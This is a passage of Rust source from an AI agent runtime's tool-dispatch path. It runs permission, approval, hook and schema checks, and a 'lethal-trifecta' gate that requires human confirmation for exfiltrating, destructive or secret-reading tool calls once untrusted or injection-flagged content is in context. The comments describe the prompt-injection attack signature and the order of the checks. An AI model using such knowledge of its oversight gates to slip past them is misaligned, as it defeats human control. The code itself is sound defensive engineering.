fn flagged_injection_percent(taint: &[crate::security::TaintRecord]) -> Option<u32> {
    taint
        .iter()
        .filter_map(|record| record.detector.as_ref())
        .filter(|verdict| verdict.flagged)
        .map(|verdict| (verdict.score * 100.0).round() as u32)
        .max()
}

/// Build the confirmation message for a lethal-trifecta gate, or `None` if the
/// tool is not a leak/destroy/secret-read vector (nor a workspace-mutating tool
/// while flagged untrusted content is in context). `taint` is non-empty.
fn trifecta_gate_reason(
    policy: &crate::security::SecurityPolicy,
    annotations: Option<&crate::tool_annotations::ToolAnnotations>,
    tool_name: &str,
    tool_args: &serde_json::Value,
    taint: &[crate::security::TaintRecord],
) -> Option<GateOutcome> {
    let mut origins: Vec<String> = taint.iter().map(|record| record.origin.clone()).collect();
    origins.sort();
    origins.dedup();
    let origins = origins.join(", ");
    // When the in-context untrusted content was flagged by the injection
    // classifier, append a confidence note and mark the decision so the UI can
    // surface the distinct `prompt_injection` risk.
    let flagged_percent = flagged_injection_percent(taint);
    let injection_note = flagged_percent
        .map(|pct| format!(" The untrusted content was flagged as a likely prompt injection ({pct}% confidence)."))
        .unwrap_or_default();
    let injection_flagged = flagged_percent.is_some();

    if crate::security::is_exfil_capable(annotations, tool_name) {
        // Precise exfil gate (opt-in): fire only on the real attack signature —
        // the untrusted ingress controls where the data goes (an
        // attacker-originated destination, recovered even from a steganographic
        // payload by `extract_endpoints`), the payload ships a secret, or the
        // untrusted content was flagged as a likely injection. A benign write to
        // a user-named / configured destination (research synthesis to a doc, a
        // connector with a fixed sink) matches none of these, so it is not gated.
        // When the flag is off this is byte-identical to the coarse "any exfil
        // while tainted" gate.
        let gate_exfil = if policy.precise_exfil_gate {
            let untrusted_endpoints: Vec<String> = taint
                .iter()
                .flat_map(|record| record.endpoints.iter().cloned())
                .collect();
            crate::security::precise_exfil_gate_fires(
                &untrusted_endpoints,
                tool_args,
                injection_flagged,
            )
        } else {
            true
        };
        if gate_exfil {
            return Some(GateOutcome {
                reason: format!(
                    "Untrusted content from {origins} is in context and `{tool_name}` can send data to an external destination.{injection_note} Confirm this is intended (lethal-trifecta guard)."
                ),
                injection_flagged,
            });
        }
        // Precise gate + benign user-named destination: skip the exfil axis and
        // fall through to the destructive / secret-read / detection arms below.
    }
    if crate::security::is_destructive(annotations) {
        return Some(GateOutcome {
            reason: format!(
                "Untrusted content from {origins} is in context and `{tool_name}` performs a destructive action.{injection_note} Confirm this is intended (lethal-trifecta guard)."
            ),
            injection_flagged,
        });
    }
    if policy.gate_secret_reads && crate::security::args_reference_secret(tool_args) {
        return Some(GateOutcome {
            reason: format!(
                "Untrusted content from {origins} is in context and `{tool_name}` reads a secret/credential file.{injection_note} Confirm this is intended (lethal-trifecta guard)."
            ),
            injection_flagged,
        });
    }
    // Detection-expanded axis (Layer 2): a flagged injection plus a tool that
    // mutates workspace files. Only fires when detection is on and the classifier
    // actually flagged the content, so it never gates benign writes.
    if policy.detect_injection && crate::security::mutates_workspace(annotations) {
        if let Some(pct) = flagged_percent {
            return Some(GateOutcome {
                reason: format!(
                    "Untrusted content from {origins} was flagged as a likely prompt injection ({pct}% confidence) and `{tool_name}` modifies workspace files. Confirm this is intended (injection guard)."
                ),
                injection_flagged: true,
            });
        }
    }
    None
}

/// Upgrade an auto-allow policy decision to an interactive ask for the
/// lethal-trifecta gate. Keeps the audit receipt (sent to the host as
/// `policyDecision`) in sync with the upgraded decision so it stays a faithful
/// record and the approval UI can surface the reason + risk labels. Always adds
/// `lethal_trifecta`; `extra_labels` carries finer-grained tags (e.g.
/// `prompt_injection`) without duplicating.
fn upgrade_to_trifecta_ask(
    decision: &mut crate::orchestration::PolicyEvaluation,
    reason: String,
    extra_labels: &[&str],
) {
    decision.action = "ask".to_string();
    decision.reason = reason;
    for label in std::iter::once("lethal_trifecta").chain(extra_labels.iter().copied()) {
        if !decision.risk_labels.iter().any(|l| l == label) {
            decision.risk_labels.push(label.to_string());
        }
    }
    if let Some(receipt) = decision.receipt.as_object_mut() {
        receipt.insert("action".to_string(), serde_json::Value::from("ask"));
        receipt.insert(
            "reason".to_string(),
            serde_json::Value::from(decision.reason.clone()),
        );
        receipt.insert(
            "risk_labels".to_string(),
            serde_json::to_value(&decision.risk_labels).unwrap_or(serde_json::Value::Null),
        );
    }
}

/// Dispatch one normalized agent tool call through the host tool runtime.
#[harn_builtin(
    sig = "__host_agent_dispatch_tool_call(call: dict, tools?: dict|nil, options?: dict|nil) -> dict",
    kind = "async",
    category = "agent.host",
    runtime_only = true
)]
async fn host_agent_dispatch_tool_call_impl(
    ctx: crate::vm::AsyncBuiltinCtx,
    args: Vec<VmValue>,
) -> Result<VmValue, VmError> {
    let mut args = args.into_iter();
    let call = args.next().ok_or_else(|| {
        VmError::Runtime(
            "__host_agent_dispatch_tool_call(call, tools?, options?): missing call".to_string(),
        )
    })?;
    let tools = agent_primitive_tools_value_arg(args.next(), "__host_agent_dispatch_tool_call")?;
    let options =
        agent_primitive_options_value_arg(args.next(), "__host_agent_dispatch_tool_call")?;
    host_agent_dispatch_tool_call(ctx, call, tools.as_ref(), &options).await
}

pub(super) async fn host_agent_dispatch_tool_call(
    ctx: crate::vm::AsyncBuiltinCtx,
    call: VmValue,
    tools: Option<&VmValue>,
    options: &crate::value::DictMap,
) -> Result<VmValue, VmError> {
    let call = match call {
        VmValue::Dict(call) => call,
        other => {
            return Err(VmError::Runtime(format!(
            "__host_agent_dispatch_tool_call(call, tools?, options?): call must be a dict; got {}",
            other.type_name()
        )))
        }
    };
    let tool_id = ["id", "tool_call_id", "call_id"]
        .iter()
        .find_map(|key| match call.get(*key) {
            Some(VmValue::String(id)) if !id.is_empty() => Some(id.to_string()),
            _ => None,
        })
        .unwrap_or_default();
    // The JSON form of the arguments is built lazily per consumer: the
    // named path needs it once (feeding `normalize_tool_args`, which takes
    // ownership so the object is not deep-cloned a second time), while the
    // denial/feedback paths re-derive it from `call` only when they fire.
    let raw_args_json = || {
        call.get("arguments")
            .map(helpers::vm_value_to_json)
            .unwrap_or(serde_json::Value::Null)
    };
    let mut tool_name = match call.get("name") {
        Some(VmValue::String(name)) if !name.trim().is_empty() => name.to_string(),
        // A missing name is a recoverable parse slip, not a reason to abort the loop.
        _ => {
            let denied = agent_primitive_denied_tool(
                "<unnamed>",
                &tool_id,
                &raw_args_json(),
                "Tool call is missing a name. Emit one tool call per turn as \
                 `name({ ... })` using a non-empty tool name from the allowed \
                 list, then retry.",
                crate::agent_events::ToolCallErrorCategory::SchemaValidation,
                None,
                None,
            );
            return Ok(json_to_vm_value(&denied));
        }
    };
    let mut tool_args = tools::normalize_tool_args(&tool_name, raw_args_json(), tools);
    let session_id = agent_primitive_option_str(options, "session_id")
        .or_else(current_agent_session_id)
        .unwrap_or_else(|| format!("agent_primitive_session_{}", uuid::Uuid::now_v7()));
    let tool_retries = agent_primitive_option_int(options, "tool_retries")
        .unwrap_or(0)
        .max(0) as usize;
    let tool_backoff_ms = agent_primitive_option_int(options, "tool_backoff_ms")
        .unwrap_or(1000)
        .max(1) as u64;
    let bridge = current_host_bridge();
    // Happy-path fast path: when NO policy/permission machinery is
    // configured, the three blocks below — session policy guard install,
    // execution-policy enforcement, and the dynamic-permission check — are
    // provable no-ops, and together they dominate the diffuse per-dispatch
    // overhead (guard key parsing, a `CapabilityPolicy::default()` per call,
    // a boxed permission future plus grant-map churn per call). Skip them
    // outright. The gate is deliberately conservative and O(1):
    // - any policy-shaped option key (even nil/invalid) → slow path, so the
    //   guard still validates/errors exactly as before;
    // - any ambient execution-policy scope (e.g. an enclosing sub-agent
    //   ceiling) → slow path;
    // - any dynamic-permission scope or cached session grant → slow path.
    // Approval policies, the trifecta gate, pre/post tool hooks, compass
    // routing, and schema validation are NOT gated here and run unchanged.
    let policy_machinery_active = agent_session_host::options_request_session_policies(options)
        || crate::orchestration::execution_policy_active()
        || permissions::dynamic_permission_policy_active()
        || permissions::session_has_grants(&session_id);
    let _policy_guard = if policy_machinery_active {
        Some(agent_session_host::install_session_policy_guard(options)?)
    } else {
        None
    };

    if let Err(policy_denial) =
        enforce_dispatch_policies(policy_machinery_active, &tool_name, &tool_args)
    {
        // Argument constraints are correctable; hard policy ceilings remain terminal.
        let denial = if policy_denial.gate == crate::agent_events::DenialGate::ArgConstraint {
            crate::agent_events::ToolDenial::retryable(
                policy_denial.gate,
                policy_denial.capability,
                policy_denial.reason,
            )
        } else {
            crate::agent_events::ToolDenial::terminal(
                policy_denial.gate,
                policy_denial.capability,
                policy_denial.reason,
            )
        };
        let schema_repair = if denial.gate == crate::agent_events::DenialGate::ToolCeiling {
            let schemas = tools::collect_tool_schemas(tools, None);
            let allowed = crate::orchestration::current_allowed_tool_names();
            crate::llm::tools::schema_match_repair_result(
                &tool_name, &tool_args, &schemas, &allowed,
            )
        } else {
            None
        };
        return Ok(deny_tool_call_value(
            &session_id,
            &tool_name,
            &tool_id,
            &tool_args,
            denial,
            false,
            None,
            schema_repair,
        ));
    }

    // Fast path: with no dynamic-permission scope installed (and none
    // installable — policy-shaped options force `policy_machinery_active`),
    // `check_dynamic_permission` returns `Ok(None)` before ever reading the
    // grants it is handed, so the take/check/store round-trip below is a
    // provable no-op. Skipping it saves a boxed future allocation plus two
    // grant-map operations (including a `String` key allocation) per call.
    let permission_outcome = if policy_machinery_active {
        let mut permission_grants = permissions::take_session_grants(&session_id);
        // Box the permission-check future: this tool-dispatch async fn sits right at
        // Clippy's `large_stack_frames` threshold, so moving this sizable nested
        // future to the heap keeps the frame comfortably under it (matches the
        // `Box::pin` treatment of the reminder-provider futures below).
        let permission_outcome = Box::pin(permissions::check_dynamic_permission(
            Some(&ctx),
            &mut permission_grants,
            &tool_name,
            &tool_args,
            &session_id,
        ))
        .await?;
        permissions::store_session_grants(&session_id, permission_grants);
        permission_outcome
    } else {
        None
    };
    if let Some(permission) = permission_outcome {
        match permission {
            permissions::PermissionCheck::Granted { reason, escalated } => {
                if escalated {
                    emit_permission_event(
                        &session_id,
                        "PermissionEscalation",
                        &tool_name,
                        &tool_args,
                        &reason,
                        true,
                    );
                }
                emit_permission_event(
                    &session_id,
                    "PermissionGrant",
                    &tool_name,
                    &tool_args,
                    &reason,
                    escalated,
                );
            }
            permissions::PermissionCheck::Denied {
                reason,
                escalated,
                recoverable,
            } => {
                if escalated {
                    emit_permission_event(
                        &session_id,
                        "PermissionEscalation",
                        &tool_name,
                        &tool_args,
                        &reason,
                        true,
                    );
                }
                // A dynamic-permission denial scoped to a specific argument
                // value/path (the tool is otherwise permitted) is RECOVERABLE:
                // coach a retry with an allowed value, mirroring the
                // ArgConstraint allow-list gate (harn#3670). A hard
                // dynamic-permission ceiling — the whole tool is denied, or an
                // approval/escalation refusal — stays terminal.
                let denial = if recoverable {
                    crate::agent_events::ToolDenial::retryable(
                        crate::agent_events::DenialGate::DynamicPermission,
                        None,
                        reason,
                    )
                } else {
                    crate::agent_events::ToolDenial::terminal(
                        crate::agent_events::DenialGate::DynamicPermission,
                        None,
                        reason,
                    )
                };
                return Ok(deny_tool_call_value(
                    &session_id,
                    &tool_name,
                    &tool_id,
                    &tool_args,
                    denial,
                    escalated,
                    None,
                    None,
                ));
            }
        }
    }

    let mut approval = crate::orchestration::current_approval_policy().map(|policy| {
        let repeat_count = crate::orchestration::next_approval_policy_repeat_count(
            &session_id,
            &tool_name,
            &tool_args,
        );
        policy.evaluate_detailed_with_repeat(&tool_name, &tool_args, repeat_count)
    });
    // Lethal-trifecta gate (Layer 1): once untrusted content has entered the
    // session's context, upgrade an auto-allow to an interactive confirmation
    // for any tool that can carry that content outward (network/fetch),
    // destroy state, or read secrets. Only acts where an approval policy is
    // installed, so non-interactive embedders are unaffected.
    {
        let security_policy = crate::security::current_policy();
        if security_policy.trifecta_gate {
            if let Some(decision) = approval.as_mut() {
                if decision.is_allow() {
                    let taint = super::agent_session_host::session_taint_snapshot(&session_id);
                    if !taint.is_empty() {
                        let annotations =
                            crate::orchestration::current_tool_annotations(&tool_name);
                        if let Some(outcome) = trifecta_gate_reason(
                            &security_policy,
                            annotations.as_ref(),
                            &tool_name,
                            &tool_args,
                            &taint,
                        ) {
                            let extra: &[&str] = if outcome.injection_flagged {
                                &["prompt_injection"]
                            } else {
                                &[]
                            };
                            upgrade_to_trifecta_ask(decision, outcome.reason, extra);
                        }
                    }
                }
            }
        }
    }
    let mut approval_status = None;
    match approval {
        None => {}
        Some(decision) if decision.is_allow() && decision.has_audit_signal() => {
            emit_permission_event_with_policy(
                &session_id,
                "PermissionGrant",
                &tool_name,
                &tool_args,
                &decision.reason,
                false,
                Some(decision.receipt.clone()),
            );
        }
        Some(decision) if decision.is_deny() => {
            let denial = crate::agent_events::ToolDenial::terminal(
                crate::agent_events::DenialGate::ApprovalPolicy,
                None,
                decision.reason,
            );
            return Ok(deny_tool_call_value(
                &session_id,
                &tool_name,
                &tool_id,
                &tool_args,
                denial,
                false,
                Some(decision.receipt),
                None,
            ));
        }
        Some(decision) if decision.is_ask() => {
            let Some(bridge) = bridge.as_ref() else {
                let denial = crate::agent_events::ToolDenial::terminal(
                    crate::agent_events::DenialGate::ApprovalUnavailable,
                    None,
                    "approval required but no host bridge is available",
                );
                return Ok(deny_tool_call_value(
                    &session_id,
                    &tool_name,
                    &tool_id,
                    &tool_args,
                    denial,
                    false,
                    Some(decision.receipt.clone()),
                    None,
                ));
            };
            let approval_id = if tool_id.is_empty() {
                format!("tool_call_{}", uuid::Uuid::now_v7())
            } else {
                tool_id.clone()
            };
            let approval_request = crate::stdlib::hitl::approval_request_for_host_permission(
                approval_id.clone(),
                tool_name.clone(),
                tool_args.clone(),
                session_id.clone(),
                Vec::new(),
                serde_json::json!({"policy_decision": decision.receipt.clone()}),
                vec![format!("tool.{tool_name}")],
            );
            let approval_request_json =
                serde_json::to_value(&approval_request).unwrap_or(serde_json::Value::Null);
            let response = bridge
                .call(
                    crate::llm::acp_permission::METHOD_REQUEST_PERMISSION,
                    crate::llm::acp_permission::request_params(
                        Some(&session_id),
                        &approval_id,
                        &tool_name,
                        &tool_args,
                        approval_request_json,
                        &decision.receipt,
                        tool_descriptor_for(tools, &tool_name),
                    ),
                )
                .await;
            match response {
                Ok(response) => match crate::llm::acp_permission::parse_response(&response) {
                    crate::llm::acp_permission::WireOutcome::Allowed => {
                        if let Some(new_args) = response.get("args") {
                            tool_args = new_args.clone();
                        }
                        approval_status = Some("host_granted");
                        emit_permission_event_with_policy(
                            &session_id,
                            "PermissionGrant",
                            &tool_name,
                            &tool_args,
                            "host approved tool call",
                            true,
                            Some(decision.receipt.clone()),
                        );
                    }
                    crate::llm::acp_permission::WireOutcome::Rejected { reason } => {
                        let denial = crate::agent_events::ToolDenial::terminal(
                            crate::agent_events::DenialGate::HostRejected,
                            None,
                            reason,
                        );
                        return Ok(deny_tool_call_value(
                            &session_id,
                            &tool_name,
                            &tool_id,
                            &tool_args,
                            denial,
                            true,
                            Some(decision.receipt.clone()),
                            None,
                        ));
                    }
                },
                Err(_) => {
                    let denial = crate::agent_events::ToolDenial::terminal(
                        crate::agent_events::DenialGate::ApprovalUnavailable,
                        None,
                        "approval request failed or host does not implement session/request_permission",
                    );
                    return Ok(deny_tool_call_value(
                        &session_id,
                        &tool_name,
                        &tool_id,
                        &tool_args,
                        denial,
                        true,
                        Some(decision.receipt.clone()),
                        None,
                    ));
                }
            }
        }
        Some(_) => {}
    }

    let mut hook_reminder_reports = Vec::new();
    let (pre_tool_action, reports) = crate::orchestration::scope_hook_reminder_reports(
        crate::agent_sessions::scope_current_tool_call(tool_id.clone(), async {
            crate::orchestration::run_pre_tool_hooks_with_ctx(Some(&ctx), &tool_name, &tool_args)
                .await
        }),
    )
    .await;
    hook_reminder_reports.extend(reports);
    let pre_tool_action = pre_tool_action?;
    let (pre_tool_result, reports) = crate::orchestration::scope_hook_reminder_reports(
        crate::agent_sessions::scope_current_tool_call(tool_id.clone(), async {
            crate::orchestration::apply_pre_tool_action(pre_tool_action, &mut tool_args)
        }),
    )
    .await;
    hook_reminder_reports.extend(reports);
    if let Some(reason) = pre_tool_result? {
        let denial = crate::agent_events::ToolDenial::terminal(
            crate::agent_events::DenialGate::HookDeny,
            None,
            reason,
        );
        let denied = deny_tool_call(
            &session_id,
            &tool_name,
            &tool_id,
            &tool_args,
            denial,
            false,
            None,
            None,
        );
        let denied = attach_hook_reminder_audit(denied, hook_reminder_reports);
        return Ok(json_to_vm_value(&denied));
    }

    // Compass tool-rewrite router (B.9, #2612). Observe freeform /
    // whole-file edit calls and either suggest the AST-precise primitive
    // (advisory; default) or rewrite the call into a provably-equivalent
    // structural form. Runs after permission / pre-tool hooks but before
    // schema validation so a rewritten call is validated against its new
    // tool. Inert when disabled or when the call is not a freeform edit.
    {
        let compass_options = compass_router::options_to_json(options);
        let compass_config = compass_router::CompassConfig::from_options(&compass_options);
        if !matches!(compass_config.mode, compass_router::CompassMode::Off) {
            let original_tool = tool_name.clone();
            let original_args = tool_args.clone();
            let decision = compass_router::route(&tool_name, &tool_args, &compass_config);
            // `rewrite` mode that could not prove equivalence degrades to a
            // suggestion; count that as `fell_back` rather than `suggested`.
            let fell_back = compass_config.mode == compass_router::CompassMode::Rewrite
                && matches!(decision, compass_router::CompassDecision::Suggest { .. });
            if let Some(event) = compass_router::routing_event(
                &decision,
                &original_tool,
                &original_args,
                &compass_config,
                fell_back,
            ) {
                agent_runtime::emit_agent_event_with_ctx(
                    Some(&ctx),
                    &crate::agent_events::AgentEvent::CompassRoutingDecision {
                        session_id: session_id.clone(),
                        tool_call_id: tool_id.clone(),
                        mode: event.mode.to_string(),
                        action: event.action.to_string(),
                        persona: event.persona,
                        original_tool: event.original_tool,
                        routed_tool: event.routed_tool,
                        target_tool: event.target_tool,
                        path: event.path,
                    },
                )
                .await;
            }
            if let compass_router::CompassDecision::Rewrite {
                tool_name: new_name,
                tool_args: new_args,
                ..
            } = &decision
            {
                tool_name = new_name.clone();
                tool_args = new_args.clone();
            }
            if let Some(reminder_body) = compass_router::apply_decision(
                &decision,
                &original_tool,
                &compass_config,
                fell_back,
            ) {
                if crate::agent_sessions::exists(&session_id) {
                    let mut reminder = crate::llm::helpers::SystemReminder::new(
                        reminder_body,
                        crate::llm::helpers::ReminderSource::StdlibProvider,
                        agent_primitive_option_int(options, "_iteration").unwrap_or(0),
                    );
                    reminder.tags = vec!["compass".to_string()];
                    reminder.dedupe_key = Some(format!("compass:{original_tool}"));
                    reminder.ttl_turns = Some(1);
                    reminder.propagate = crate::llm::helpers::ReminderPropagate::None;
                    reminder.role_hint = crate::llm::helpers::ReminderRoleHint::Developer;
                    let _ = crate::agent_sessions::inject_reminder(&session_id, reminder);
                }
            }
        }
    }

    let tool_schemas = tools::collect_tool_schemas(tools, None);
    if let Err(message) = tools::validate_tool_args(&tool_name, &tool_args, &tool_schemas) {
        // Argument-DELIVERY faults — a `{"__parse_error": "..."}` carrier from
        // the streamed-arg parser, or empty (`{}` / null) arguments — are a
        // provider-boundary fault class, not a model slip. Replace the
        // misdiagnosing missing-parameter message with cause-named feedback
        // (keyed off the parser diagnostic and the turn's provider stop reason,
        // threaded in by the agent loop as `_stop_reason`). See
        // `arg_delivery_fault_feedback`.
        let turn_stop_reason = agent_primitive_option_str(options, "_stop_reason");
        let cause_named = arg_delivery_fault_feedback(
            &tool_name,
            // Re-derive the pre-normalization JSON args lazily: this failure
            // path is the only late consumer, and `call` is still in scope.
            &raw_args_json(),
            turn_stop_reason.as_deref().filter(|s| !s.is_empty()),
        );
        let (message, cause) = match cause_named {
            Some((cause_message, cause)) => (cause_message, Some(cause)),
            None => (message, None),
        };
        // Schema validation is not a policy denial — the model can fix the
        // arguments and retry — so no structured `ToolDenial` is attached.
        let mut denied = agent_primitive_denied_tool(
            &tool_name,
            &tool_id,
            &tool_args,
            message,
            crate::agent_events::ToolCallErrorCategory::SchemaValidation,
            None,
            None,
        );
        if let Some(cause) = cause {
            // Machine-readable cause on both the envelope (for host harnesses
            // reading the dispatch outcome) and the inner model-facing result
            // (so it rides the transcript).
            denied["cause"] = serde_json::json!(cause);
            if let Some(result) = denied.get_mut("result") {
                result["cause"] = serde_json::json!(cause);
            }
        }
        let denied = attach_hook_reminder_audit(denied, hook_reminder_reports);
        return Ok(json_to_vm_value(&denied));
    }

    let started = std::time::Instant::now();
    // Session-scoped MCP clients (from opts.mcp_servers) bypass the bridge.
    let session_mcp = {
        use std::collections::BTreeMap;
        let mut clients: BTreeMap<String, crate::mcp::VmMcpClientHandle> =
            std::collections::BTreeMap::new();
        if let Some(server_name) = agent_tools::mcp_server_for_tool(tools, &tool_name) {
            if let Some(handle) = agent_runtime::session_mcp_client(&session_id, &server_name) {
                clients.insert(server_name, handle);
            }
        }
        clients
    };
    let mcp_clients_ref = if session_mcp.is_empty() {
        None
    } else {
        Some(&session_mcp)
    };
    let (cancel_handle, _cancel_guard) = crate::tool_call_cancellations::register(
        session_id.clone(),
        tool_id.clone(),
        tool_name.clone(),
    )
    .map(|(handle, guard)| (Some(handle), Some(guard)))
    .unwrap_or((None, None));
    // Heap-pin the dispatch future. The tool-execution path builds large
    // per-call state (e.g. `LlmCallOptions`/`LlmRequestPayload`), so keeping
    // this future inline in the parent frame pushes the enclosing async fn
    // over clippy's `large_stack_frames` threshold. Boxing moves that state
    // onto the heap; both await arms below consume the `Pin<Box<_>>` directly.
    let mut dispatch_future = Box::pin(crate::agent_sessions::scope_current_tool_call(
        tool_id.clone(),
        async {
            agent_tools::dispatch_tool_execution_with_mcp(
                Some(&ctx),
                &tool_name,
                &tool_args,
                tools,
                mcp_clients_ref,
                bridge.as_ref(),
                tool_retries,
                tool_backoff_ms,
            )
            .await
        },
    ));
    let (outcome, preempted_by_cancel) = match cancel_handle.as_ref() {
        Some(handle) => {
            // Race the dispatch against the cancellation signal. When the
            // signal wins, the dispatch future is dropped immediately — the
            // tool's own resources unwind via tokio's drop guarantees.
            // Tools that hold non-droppable state (long-lived subprocesses)
            // can additionally honor the per-call handle through
            // `crate::tool_call_cancellations::lookup` to coordinate
            // graceful shutdown.
            //
            // The dispatch arm is `biased`, so a dispatch that finishes in
            // the same tick as cancellation still wins — the side effect
            // already landed, so reporting "cancelled" then would lie about
            // what actually happened.
            let cancel_wait = handle.cancelled();
            tokio::pin!(cancel_wait);
            tokio::select! {
                biased;
                outcome = &mut dispatch_future => (outcome, false),
                _ = &mut cancel_wait => (
                    agent_tools::ToolDispatchOutcome {
                        result: Err(VmError::CategorizedError {
                            message: handle
                                .reason()
                                .unwrap_or_else(|| "tool call cancelled in-flight".to_string()),
                            category: crate::value::ErrorCategory::Cancelled,
                        }),
                        executor: None,
                    },
                    true,
                ),
            }
        }
        None => (dispatch_future.await, false),
    };
    let execution_duration_ms = started.elapsed().as_millis() as u64;
    let executor = outcome
        .executor
        .as_ref()
        .and_then(|executor| serde_json::to_value(executor).ok());

    // If the dispatch was actually preempted by `cancel_in_flight_tool_call`,
    // surface a `status: "cancelled"` tool_result rather than tearing down
    // the loop the way a session-wide cancel would. Honors the user's
    // intent without lying about side effects that may have already
    // landed before the cancel arrived (the dispatch arm above wins ties).
    if preempted_by_cancel {
        let reason = cancel_handle
            .as_ref()
            .and_then(|handle| handle.reason())
            .unwrap_or_default();
        let cancelled = agent_primitive_cancelled_tool(
            &tool_name,
            &tool_id,
            &tool_args,
            &reason,
            executor.clone(),
            execution_duration_ms,
            approval_status,
        );
        let cancelled = attach_hook_reminder_audit(cancelled, hook_reminder_reports);
        return Ok(json_to_vm_value(&cancelled));
    }

    match outcome.result {
        Ok(raw_result) => {
            let mutation_status = structured_tool_mutation_status(&raw_result);
            let changed_paths = structured_tool_changed_paths(&raw_result);
            // Render from a base64-elided copy so a screenshot (or any image)
            // result does not swamp the transcript text — the full image payload
            // still travels to the model as an image content block via the
            // structured `result` field below and the tool-result recording path.
            let rendered_before_hooks =
                agent_tools::render_tool_result(&agent_tools::elide_image_base64(&raw_result));
            let (rendered, reports) = crate::orchestration::scope_hook_reminder_reports(
                crate::agent_sessions::scope_current_tool_call(tool_id.clone(), async {
                    crate::orchestration::run_post_tool_hooks_with_ctx(
                        Some(&ctx),
                        &tool_name,
                        &tool_args,
                        &rendered_before_hooks,
                    )
                    .await
                }),
            )
            .await;
            hook_reminder_reports.extend(reports);
            let rendered = rendered?;
            let output_truncated = rendered.len() < rendered_before_hooks.len();
            let reminder_payload = serde_json::json!({
                "event": crate::orchestration::HookEvent::PostToolUse.as_str(),
                "session": {"id": &session_id},
                "iteration": agent_primitive_option_int(options, "_iteration").unwrap_or(0),
                "tool": {"name": &tool_name, "args": &tool_args},
                "tool_name": &tool_name,
                "result": {
                    "text": &rendered,
                    "truncated": output_truncated,
                    "original_size": rendered_before_hooks.len(),
                    "final_size": rendered.len(),
                },
                "truncated": output_truncated,
                "original_size": rendered_before_hooks.len(),
                "final_size": rendered.len(),
            });
            let reminder_report = Box::pin(super::reminder_providers::evaluate_and_inject(
                Some(&ctx),
                crate::orchestration::HookEvent::PostToolUse,
                &session_id,
                reminder_payload,
                super::reminder_providers::options_map_to_json(options),
            ))
            .await?;
            let denied = agent_tools::is_denied_tool_result(&raw_result);
            // A dispatch that returned `Ok(..)` can still carry a failure in the
            // result body (host-bridge `{ok:false}` / `{status:"error"}` /
            // `{error:".."}` envelopes, or an MCP-shaped `{isError:true}` that
            // wasn't already thrown). Surface those as a failure instead of
            // laundering them into `ok:true` — the agent loop reads `ok`/`status`
            // to decide whether the tool succeeded.
            let body_failure = if denied {
                None
            } else {
                agent_tools::ok_result_failure_category(&raw_result)
            };
            let is_failure = denied || body_failure.is_some();
            let error_category = if denied {
                Some("tool_rejected")
            } else {
                body_failure
            };
            let observation =
                format!("[result of {tool_name}]\n{rendered}\n[end of {tool_name} result]\n");
            let error = is_failure.then(|| rendered.clone());
            let result = serde_json::json!({
                "ok": !is_failure,
                "status": if is_failure { "error" } else { "ok" },
                "tool_name": tool_name.clone(),
                "tool_call_id": tool_id,
                "arguments": tool_args,
                "result": raw_result,
                "rendered_result": rendered,
                "observation": observation,
                "error": error,
                "error_category": error_category,
                "mutation_status": mutation_status,
                "changed_paths": changed_paths,
                "executor": executor,
                "approval": approval_status,
                "execution_duration_ms": execution_duration_ms,
                "tool_output_truncated": output_truncated,
                "original_size": rendered_before_hooks.len(),
                "final_size": rendered.len(),
                "reminder_provider_report": reminder_report,
            });
            let result = attach_hook_reminder_audit(result, hook_reminder_reports);
            Ok(json_to_vm_value(&result))
        }
        Err(error) => {
            let category = crate::value::error_to_category(&error);
            if matches!(category, crate::value::ErrorCategory::Cancelled) {
                return Err(error);
            }
            let error_text = error.to_string();
            let observation =
                format!("[error from {tool_name}]\n{error_text}\n[end of {tool_name} error]\n");
            let reminder_payload = serde_json::json!({
                "event": crate::orchestration::HookEvent::PostToolUse.as_str(),
                "session": {"id": &session_id},
                "iteration": agent_primitive_option_int(options, "_iteration").unwrap_or(0),
                "tool": {"name": &tool_name, "args": &tool_args},
                "tool_name": &tool_name,
                "status": "error",
                "ok": false,
                "error": &error_text,
                "error_category": category.as_str(),
                "result": {
                    "text": &error_text,
                    "status": "error",
                    "ok": false,
                    "error": &error_text,
                },
            });
            let reminder_report = Box::pin(super::reminder_providers::evaluate_and_inject(
                Some(&ctx),
                crate::orchestration::HookEvent::PostToolUse,
                &session_id,
                reminder_payload,
                super::reminder_providers::options_map_to_json(options),
            ))
            .await?;
            let result = serde_json::json!({
                "ok": false,
                "status": "error",
                "tool_name": tool_name,
                "tool_call_id": tool_id,
                "arguments": tool_args,
                "result": null,
                "rendered_result": error_text,
                "observation": observation,
                "error": error_text,
                "error_category": category.as_str(),
                "mutation_status": crate::agent_events::ToolMutationStatus::Unknown.as_str(),
                "changed_paths": serde_json::Value::Null,
                "executor": executor,
                "approval": approval_status,
                "execution_duration_ms": execution_duration_ms,
                "reminder_provider_report": reminder_report,
            });
            let result = attach_hook_reminder_audit(result, hook_reminder_reports);
            Ok(json_to_vm_value(&result))
        }
    }
}

/// Connect to each MCP server in specs, list their tools (prefixed with
/// server_name__), store handles keyed by session_id, and return
/// Tag a single MCP tool descriptor for the agent tool surface.
///
/// Namespaces the tool name (`<server>__<tool>`), records the MCP
/// executor wiring (`executor`/`mcp_server`/`_mcp_server`/
/// `_mcp_tool_name`) so dispatch and the `tool_search` BM25 indexer can
/// find it, and — unless `eager_schemas` is set on the spec — flags it
/// `defer_loading: true`.
///
/// `defer_loading` is the progressive-disclosure default (harn#2649):
/// the lightweight catalog (name + one-line description) ships up front,
/// but the full JSON `inputSchema` is held back until the model surfaces
/// the tool via `tool_search` or calls it directly. This keeps MCP
/// servers with many tools from spending the whole tool budget on
/// schemas the agent never reaches for. Callers opt back into eager
/// schemas with `eager_schemas: true` on the server spec.
fn tag_mcp_tool(
    mut tool: serde_json::Value,
    server_name: &str,
    eager_schemas: bool,
) -> serde_json::Value {
    if let Some(obj) = tool.as_object_mut() {
        let original_name = obj
            .get("name")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let prefixed_name = format!("{server_name}__{original_name}");
        // Namespace to avoid conflicts between servers.
        obj.insert("name".into(), serde_json::Value::String(prefixed_name));
        obj.insert(
            "executor".into(),
            serde_json::Value::String("mcp_server".into()),
        );
        obj.insert(
            "mcp_server".into(),
            serde_json::Value::String(server_name.to_string()),
        );
        obj.insert(
            "_mcp_server".into(),
            serde_json::Value::String(server_name.to_string()),
        );
        obj.insert(
            "_mcp_tool_name".into(),
            serde_json::Value::String(original_name),
        );
        // Progressive disclosure on by default; opt out per-spec with
        // `eager_schemas: true`. Never clobber an explicit per-tool
        // `defer_loading` the server itself advertised.
        if !eager_schemas && !obj.contains_key("defer_loading") {
